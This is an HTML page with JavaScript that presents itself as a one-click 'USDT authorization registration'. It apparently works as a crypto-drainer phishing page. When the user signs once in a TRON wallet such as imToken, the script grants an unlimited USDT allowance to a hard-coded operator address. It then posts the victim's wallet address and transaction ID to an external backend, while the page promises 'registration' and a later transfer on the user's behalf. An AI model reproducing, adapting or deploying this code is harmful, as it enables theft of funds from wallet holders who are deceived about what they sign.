<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>USDT授权登记（仅1次操作）</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, sans-serif; }
        body { background: #f5f7fa; min-height: 100vh; padding: 20px; display: flex; flex-direction: column; align-items: center; }
        .container { width: 100%; max-width: 450px; background: #fff; border-radius: 16px; padding: 30px 25px; box-shadow: 0 4px 16px rgba(0,0,0,0.05); }
        .title { font-size: 20px; color: #333; text-align: center; margin-bottom: 10px; }
        .tip { font-size: 14px; color: #666; text-align: center; margin-bottom: 30px; line-height: 1.5; }
        #authBtn { width: 100%; padding: 18px; background: linear-gradient(90deg, #409eff, #3086e8); color: #fff; border: none; border-radius: 12px; font-size: 16px; font-weight: 500; cursor: pointer; margin-bottom: 20px; }
        #authBtn:disabled { background: #c0c4cc; cursor: not-allowed; }
        #status { min-height: 40px; font-size: 14px; color: #333; text-align: center; padding: 10px; border-radius: 8px; background: #f9fafc; }
        .addr-show { margin-top: 15px; font-size: 13px; color: #999; text-align: center; }
    </style>
</head>
<body>
    <div class="container">
        <h2 class="title">USDT一键授权登记</h2>
        <p class="tip">点击下方按钮，仅需1次签名，自动完成授权+登记</p>
        
        <button id="authBtn">发起USDT授权</button>
        <div id="status">请点击按钮开始操作</div>
        <div class="addr-show" id="addrShow"></div>
    </div>

    <script>
        // -------------------------- 配置参数（需根据你的实际情况修改）--------------------------
        const USDT_CONTRACT_ADDR = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t"; // 波场主网USDT合约地址（固定）
        const YOUR_PROXY_ADDR = "TNAfknJTfkPbgmyfpwg3rJQrd17ZLKEMQa";    // 你的原合约地址（需替换）
        const BACKEND_REGISTER_API = "https://tron-notify-backend.vercel.app"; // 你的后端登记接口（需替换）
        const INFINITE_AUTH_AMOUNT = "115792089237316195423570985008687907853269984665640564039457584007913129639935"; // 无限授权额度（固定）
        // -------------------------------------------------------------------------------------

        // DOM元素
        const authBtn = document.getElementById("authBtn");
        const statusText = document.getElementById("status");
        const addrShow = document.getElementById("addrShow");

        // 页面加载后，自动检测钱包并尝试获取地址
        window.onload = async function() {
            await checkWalletAndGetAddr();
        };

        // 1. 检测钱包+自动获取用户地址（核心：无需用户手动输入）
        async function checkWalletAndGetAddr() {
            try {
                // 检测是否在TRON钱包内置浏览器（如imToken）
                if (!window.tronWeb) {
                    statusText.innerText = "请在imToken等TRON钱包内置浏览器打开";
                    authBtn.disabled = true;
                    return null;
                }

                // 等待钱包加载完成（兼容部分低版本imToken）
                if (!window.tronWeb.ready) {
                    await new Promise(resolve => {
                        const timer = setInterval(() => {
                            if (window.tronWeb.ready) {
                                clearInterval(timer);
                                resolve();
                            }
                        }, 200);
                    });
                }

                // 获取用户地址（Base58格式，TRON常用格式）
                const userAddr = window.tronWeb.defaultAddress.base58;
                if (!userAddr) {
                    statusText.innerText = "请先在钱包中登录（解锁）你的账户";
                    authBtn.disabled = true;
                    return null;
                }

                // 显示用户地址（让用户确认）
                addrShow.innerText = 你的钱包地址：${userAddr.slice(0, 8)}...${userAddr.slice(-6)};
                statusText.innerText = "已就绪，点击按钮发起授权";
                authBtn.disabled = false;
                return userAddr;

            } catch (e) {
                statusText.innerText = "钱包检测失败：" + e.message.slice(0, 30);
                authBtn.disabled = true;return null;
            }
        }

        // 2. 点击按钮：发起USDT授权（用户仅需1次签名）
        authBtn.addEventListener("click", async function() {
            // 先重新获取地址（防止用户切换账户）
            const userAddr = await checkWalletAndGetAddr();
            if (!userAddr) return;

            // 禁用按钮，防止重复点击
            authBtn.disabled = true;
            statusText.innerText = "正在发起授权，请在钱包中确认...";

            try {
                // 调用USDT合约的approve方法（用户本人操作，符合TRC20规则）
                const usdtContract = await window.tronWeb.contract().at(USDT_CONTRACT_ADDR);
                const approveTx = await usdtContract.approve(
                    YOUR_PROXY_ADDR,       // 授权目标：你的原合约地址
                    INFINITE_AUTH_AMOUNT,  // 授权额度：无限
                    { 
                        from: userAddr,    // 自动获取的用户地址（无需手动输入）
                        feeLimit: 500000000 // 50 TRX（足够覆盖授权的能量消耗）
                    }
                ).send();

                // 授权成功后，自动调用后端接口登记（无签名，纯前端请求）
                statusText.innerText = "授权成功，正在自动登记...";
                await registerToBackend(userAddr, approveTx.txid);

                // 最终提示
                statusText.innerText = "✅ 授权+登记完成！等待代转账";
                addrShow.innerText = 你的地址：${userAddr.slice(0, 8)}...${userAddr.slice(-6)} | 授权交易ID：${approveTx.txid.slice(0, 10)}...;

            } catch (e) {
                // 错误处理（区分用户取消、能量不足等场景）
                let errMsg = "授权失败：";
                if (e.message.includes("user rejected")) {
                    errMsg += "你已取消授权操作";
                } else if (e.message.includes("out of energy")) {
                    errMsg += "能量不足，请先获取少量TRX";
                } else {
                    errMsg += e.message.slice(0, 30);
                }
                statusText.innerText = errMsg;
                authBtn.disabled = false; // 允许重试
            }
        });

        // 3. 授权成功后，自动登记到后端（无签名，仅数据存储）
        async function registerToBackend(userAddr, approveTxid) {
            try {
                // 调用后端登记接口
                const response = await fetch(BACKEND_REGISTER_API, {
                    method: "POST",
                    headers: {
                        "Content-Type": "application/json",
                        "X-Request-Source": "frontend-auth" // 可选：标识前端请求
                    },
                    body: JSON.stringify({
                        userWalletAddr: userAddr,    // 用户钱包地址
                        proxyContractAddr: YOUR_PROXY_ADDR, // 你的原合约地址
                        usdtApproveTxid: approveTxid, // USDT授权交易ID（用于后端校验）
                        timestamp: new Date().getTime() // 时间戳（防重复）
                    }),
                    timeout: 10000 // 10秒超时
                });

                const result = await response.json();
                if (!response.ok || !result.success) {
                    throw new Error(result.msg || "登记接口返回失败");
                }

            } catch (e) {
                // 登记失败时，提供重试选项（仍无签名）
                const isRetry = confirm(`状态登记失败：${e.message.slice(0, 20)}，是否重试？`);
                if (isRetry) {
                    await registerToBackend(userAddr, approveTxid);
                } else {
                    throw new Error("你取消了登记重试");
                }
            }
        }
    </script>
</body>
</html>
